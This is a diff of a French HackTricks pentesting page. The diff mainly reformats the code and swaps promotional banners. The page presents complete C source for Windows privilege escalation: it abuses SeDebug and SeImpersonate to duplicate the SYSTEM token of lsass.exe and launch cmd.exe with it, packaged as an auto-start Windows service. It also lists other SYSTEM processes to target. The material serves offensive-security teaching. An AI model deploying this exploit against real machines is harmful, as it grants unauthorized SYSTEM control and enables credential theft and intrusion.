@@ -1,6 +1,24 @@
-Le code suivant exploite les privilèges SeDebug et SeImpersonate pour copier le jeton d'un processus s'exécutant en tant que SYSTEM et avec tous les privilèges de jeton. Dans ce cas, ce code peut être compilé et utilisé en tant que binaire de service Windows pour vérifier qu'il fonctionne. Cependant, la partie principale du code où l'élévation se produit se trouve à l'intérieur de la fonction `Exploit`. À l'intérieur de cette fonction, vous pouvez voir que le processus lsass.exe est recherché, puis son jeton est copié, et enfin ce jeton est utilisé pour lancer un nouveau cmd.exe avec tous les privilèges du jeton copié.
+<details>
 
-D'autres processus s'exécutant en tant que SYSTEM avec tous ou la plupart des privilèges de jeton sont : services.exe, svhost.exe (l'un des premiers), wininit.exe, csrss.exe... (rappelez-vous que vous ne pourrez pas copier un jeton à partir d'un processus protégé). De plus, vous pouvez utiliser l'outil Process Hacker en cours d'exécution en tant qu'administrateur pour voir les jetons d'un processus.
+<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+
+Autres moyens de soutenir HackTricks :
+
+* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
+* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
+* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+
+</details>
+
+
+Le code suivant **exploite les privilèges SeDebug et SeImpersonate** pour copier le jeton d'un **processus exécuté en tant que SYSTEM** et avec **tous les privilèges du jeton**. \
+Dans ce cas, ce code peut être compilé et utilisé comme un **binaire de service Windows** pour vérifier qu'il fonctionne.\
+Cependant, la partie principale du **code où l'élévation se produit** se trouve dans la **fonction `Exploit`**.\
+À l'intérieur de cette fonction, vous pouvez voir que le **processus **_**lsass.exe**_** est recherché**, puis son **jeton est copié**, et enfin ce **jeton est utilisé pour lancer un nouveau **_**cmd.exe**_** avec tous les privilèges du jeton copié**.
+
+**D'autres processus** exécutés en tant que SYSTEM avec tous ou la plupart des privilèges du jeton sont : _**services.exe**_, _**svhost.exe**_ (l'un des premiers), _**wininit.exe**_, _**csrss.exe**_... (rappelez-vous que vous ne pourrez pas copier un jeton d'un processus protégé). De plus, vous pouvez utiliser l'outil [Process Hacker](https://processhacker.sourceforge.io/downloads.php) exécuté en tant qu'administrateur pour voir les jetons d'un processus.
 ```c
 #include <windows.h>
 #include <tlhelp32.h>
@@ -15,209 +33,208 @@ HANDLE stopServiceEvent = 0;
 //This function will find the pid of a process by name
 int FindTarget(const char *procname) {
 
-	HANDLE hProcSnap;
-	PROCESSENTRY32 pe32;
-	int pid = 0;
-			
-	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
-			
-	pe32.dwSize = sizeof(PROCESSENTRY32); 
-			
-	if (!Process32First(hProcSnap, &pe32)) {
-			CloseHandle(hProcSnap);
-			return 0;
-	}
-			
-	while (Process32Next(hProcSnap, &pe32)) {
-			if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
-					pid = pe32.th32ProcessID;
-					break;
-			}
-	}
-			
-	CloseHandle(hProcSnap);
-			
-	return pid;
+HANDLE hProcSnap;
+PROCESSENTRY32 pe32;
+int pid = 0;
+
+hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
+
+pe32.dwSize = sizeof(PROCESSENTRY32);
+
+if (!Process32First(hProcSnap, &pe32)) {
+CloseHandle(hProcSnap);
+return 0;
+}
+
+while (Process32Next(hProcSnap, &pe32)) {
+if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
+pid = pe32.th32ProcessID;
+break;
+}
+}
+
+CloseHandle(hProcSnap);
+
+return pid;
 }
 
 
 int Exploit(void) {
-	
-    HANDLE hSystemToken, hSystemProcess;
-	HANDLE dupSystemToken = NULL;
-    HANDLE hProcess, hThread;
-    STARTUPINFOA si;
-    PROCESS_INFORMATION pi;
-	int pid = 0;
+
+HANDLE hSystemToken, hSystemProcess;
+HANDLE dupSystemToken = NULL;
+HANDLE hProcess, hThread;
+STARTUPINFOA si;
+PROCESS_INFORMATION pi;
+int pid = 0;
 
 
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    ZeroMemory(&pi, sizeof(pi));
+ZeroMemory(&si, sizeof(si));
+si.cb = sizeof(si);
+ZeroMemory(&pi, sizeof(pi));
 
-	// open high privileged process
-	if ( pid = FindTarget("lsass.exe") ) 
-		hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
-	else
-		return -1;
-	
-	// extract high privileged token
-    if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
-        CloseHandle(hSystemProcess);
-        return -1;
-    }
-	
-	// make a copy of a token
-	DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);	
+// open high privileged process
+if ( pid = FindTarget("lsass.exe") )
+hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+else
+return -1;
 
-	// and spawn a new process with higher privs
-    CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe", 
-						NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+// extract high privileged token
+if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
+CloseHandle(hSystemProcess);
+return -1;
+}
 
-    return 0;
+// make a copy of a token
+DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);
+
+// and spawn a new process with higher privs
+CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
+NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+
+return 0;
 }
 
 
 void WINAPI ServiceControlHandler( DWORD controlCode ) {
-	switch ( controlCode ) {
-		case SERVICE_CONTROL_SHUTDOWN:
-		case SERVICE_CONTROL_STOP:
-			serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
-			SetServiceStatus( serviceStatusHandle, &serviceStatus );
+switch ( controlCode ) {
+case SERVICE_CONTROL_SHUTDOWN:
+case SERVICE_CONTROL_STOP:
+serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
+SetServiceStatus( serviceStatusHandle, &serviceStatus );
 
-			SetEvent( stopServiceEvent );
-			return;
+SetEvent( stopServiceEvent );
+return;
 
-		case SERVICE_CONTROL_PAUSE:
-			break;
+case SERVICE_CONTROL_PAUSE:
+break;
 
-		case SERVICE_CONTROL_CONTINUE:
-			break;
+case SERVICE_CONTROL_CONTINUE:
+break;
 
-		case SERVICE_CONTROL_INTERROGATE:
-			break;
+case SERVICE_CONTROL_INTERROGATE:
+break;
 
-		default:
-			break;
-	}
-	SetServiceStatus( serviceStatusHandle, &serviceStatus );
+default:
+break;
+}
+SetServiceStatus( serviceStatusHandle, &serviceStatus );
 }
 
 void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
-	// initialise service status
-	serviceStatus.dwServiceType = SERVICE_WIN32;
-	serviceStatus.dwCurrentState = SERVICE_STOPPED;
-	serviceStatus.dwControlsAccepted = 0;
-	serviceStatus.dwWin32ExitCode = NO_ERROR;
-	serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
-	serviceStatus.dwCheckPoint = 0;
-	serviceStatus.dwWaitHint = 0;
+// initialise service status
+serviceStatus.dwServiceType = SERVICE_WIN32;
+serviceStatus.dwCurrentState = SERVICE_STOPPED;
+serviceStatus.dwControlsAccepted = 0;
+serviceStatus.dwWin32ExitCode = NO_ERROR;
+serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
+serviceStatus.dwCheckPoint = 0;
+serviceStatus.dwWaitHint = 0;
 
-	serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );
+serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );
 
-	if ( serviceStatusHandle ) {
-		// service is starting
-		serviceStatus.dwCurrentState = SERVICE_START_PENDING;
-		SetServiceStatus( serviceStatusHandle, &serviceStatus );
+if ( serviceStatusHandle ) {
+// service is starting
+serviceStatus.dwCurrentState = SERVICE_START_PENDING;
+SetServiceStatus( serviceStatusHandle, &serviceStatus );
 
-		// do initialisation here
-		stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );
+// do initialisation here
+stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );
 
-		// running
-		serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
-		serviceStatus.dwCurrentState = SERVICE_RUNNING;
-		SetServiceStatus( serviceStatusHandle, &serviceStatus );
+// running
+serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
+serviceStatus.dwCurrentState = SERVICE_RUNNING;
+SetServiceStatus( serviceStatusHandle, &serviceStatus );
 
-		Exploit();
-		WaitForSingleObject( stopServiceEvent, -1 );
+Exploit();
+WaitForSingleObject( stopServiceEvent, -1 );
 
-		// service was stopped
-		serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
-		SetServiceStatus( serviceStatusHandle, &serviceStatus );
+// service was stopped
+serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
+SetServiceStatus( serviceStatusHandle, &serviceStatus );
 
-		// do cleanup here
-		CloseHandle( stopServiceEvent );
-		stopServiceEvent = 0;
+// do cleanup here
+CloseHandle( stopServiceEvent );
+stopServiceEvent = 0;
 
-		// service is now stopped
-		serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
-		serviceStatus.dwCurrentState = SERVICE_STOPPED;
-		SetServiceStatus( serviceStatusHandle, &serviceStatus );
-	}
+// service is now stopped
+serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
+serviceStatus.dwCurrentState = SERVICE_STOPPED;
+SetServiceStatus( serviceStatusHandle, &serviceStatus );
+}
 }
 
 
 void InstallService() {
-	SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );
+SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );
 
-	if ( serviceControlManager ) {
-		TCHAR path[ _MAX_PATH + 1 ];
-		if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
-			SC_HANDLE service = CreateService( serviceControlManager,
-							serviceName, serviceName,
-							SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
-							SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
-							0, 0, 0, 0, 0 );
-			if ( service )
-				CloseServiceHandle( service );
-		}
-		CloseServiceHandle( serviceControlManager );
-	}
+if ( serviceControlManager ) {
+TCHAR path[ _MAX_PATH + 1 ];
+if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
+SC_HANDLE service = CreateService( serviceControlManager,
+serviceName, serviceName,
+SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
+SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
+0, 0, 0, 0, 0 );
+if ( service )
+CloseServiceHandle( service );
+}
+CloseServiceHandle( serviceControlManager );
+}
 }
 
 void UninstallService() {
-	SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );
+SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );
 
-	if ( serviceControlManager ) {
-		SC_HANDLE service = OpenService( serviceControlManager,
-			serviceName, SERVICE_QUERY_STATUS | DELETE );
-		if ( service ) {
-			SERVICE_STATUS serviceStatus;
-			if ( QueryServiceStatus( service, &serviceStatus ) ) {
-				if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
-					DeleteService( service );
-			}
-			CloseServiceHandle( service );
-		}
-		CloseServiceHandle( serviceControlManager );
-	}
+if ( serviceControlManager ) {
+SC_HANDLE service = OpenService( serviceControlManager,
+serviceName, SERVICE_QUERY_STATUS | DELETE );
+if ( service ) {
+SERVICE_STATUS serviceStatus;
+if ( QueryServiceStatus( service, &serviceStatus ) ) {
+if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
+DeleteService( service );
+}
+CloseServiceHandle( service );
+}
+CloseServiceHandle( serviceControlManager );
+}
 }
 
 int _tmain( int argc, TCHAR* argv[] )
 {
-	if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
-		InstallService();
-	}
-	else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
-		UninstallService();
-	}
-	else  {
-		SERVICE_TABLE_ENTRY serviceTable[] = {
-			{ serviceName, ServiceMain },
-			{ 0, 0 }
-		};
-	
-		StartServiceCtrlDispatcher( serviceTable );
-	}	
+if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
+InstallService();
+}
+else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
+UninstallService();
+}
+else  {
+SERVICE_TABLE_ENTRY serviceTable[] = {
+{ serviceName, ServiceMain },
+{ 0, 0 }
+};
 
-	return 0;
+StartServiceCtrlDispatcher( serviceTable );
+}
+
+return 0;
 }
 ```
 **Le code de cet exemple a été partagé par une personne anonyme.**
 
+
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> !</strong></summary>
 
-- Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+Autres moyens de soutenir HackTricks :
 
-- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-
-- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-
-- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-
-- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
+* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
